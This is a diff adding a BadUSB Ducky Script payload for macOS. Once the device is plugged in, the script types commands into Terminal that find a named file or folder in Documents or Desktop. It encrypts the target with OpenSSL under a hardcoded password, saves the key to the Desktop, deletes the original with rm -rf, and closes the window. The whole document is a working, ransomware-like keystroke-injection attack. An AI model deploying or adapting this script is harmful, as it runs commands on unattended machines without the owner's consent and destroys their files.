@@ -1,0 +1,63 @@
+REM BadUSB script for macOS - Encrypt fileToEncrypt or folderToEncrypt from Documents or Desktop
+
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Check if fileToEncrypt or folderToEncrypt exists in Documents or Desktop and cd there
+STRING if [ -f ~/Documents/fileToEncrypt ] || [ -d ~/Documents/folderToEncrypt ]; then cd ~/Documents; elif [ -f ~/Desktop/fileToEncrypt ] || [ -d ~/Desktop/folderToEncrypt ]; then cd ~/Desktop; else echo "Nothing to encrypt"; exit 1; fi
+ENTER
+DELAY 500
+
+REM Check for fileToEncrypt or folderToEncrypt and set variable FILE
+STRING if [ -f "fileToEncrypt" ]; then FILE="fileToEncrypt"; elif [ -d "folderToEncrypt" ]; then FILE="folderToEncrypt"; else echo "Nothing to encrypt"; exit 1; fi
+ENTER
+DELAY 500
+
+REM Determine file type: if FILE is a file, extract its extension; if a folder then set EXT to tar.gz
+STRING if [ -f "$FILE" ]; then EXT="${FILE##*.}"; else EXT="tar.gz"; fi
+ENTER
+DELAY 500
+
+REM If the target is a folder, compress it into an archive and update FILE variable
+STRING if [ -d "$FILE" ]; then tar -czf "${FILE}.tar.gz" "$FILE" && FILE="${FILE}.tar.gz"; fi
+ENTER
+DELAY 500
+
+REM Define the encryption key (do not store this value elsewhere on the device)
+STRING KEY="S3cur3P@ssw0rd!"
+ENTER
+DELAY 250
+
+REM Encrypt the file using OpenSSL with the chosen key
+STRING openssl enc -aes-256-cbc -salt -in "$FILE" -out ~/Desktop/ENCRYPTED.enc -pass pass:$KEY
+ENTER
+DELAY 500
+
+REM Store the encryption key in a file on the Desktop (and do not leave it elsewhere)
+STRING echo $KEY > ~/Desktop/ENCRYPTED_KEY.txt
+ENTER
+DELAY 250
+STRING chmod 600 ~/Desktop/ENCRYPTED_KEY.txt
+ENTER
+DELAY 250
+
+REM Remove the original file (or archive)
+STRING rm -rf "$FILE"
+ENTER
+DELAY 500
+
+REM Print decryption instructions (output file will use the original extension)
+STRING echo "Encryption complete. To decrypt, run:"
+ENTER
+DELAY 250
+STRING echo "openssl enc -aes-256-cbc -d -in ~/Desktop/ENCRYPTED.enc -out ~/Desktop/yourfile.${EXT} -pass pass:\$(cat ~/Desktop/ENCRYPTED_KEY.txt)"
+ENTER
+DELAY 1000
+
+REM Close the Terminal window
+GUI w
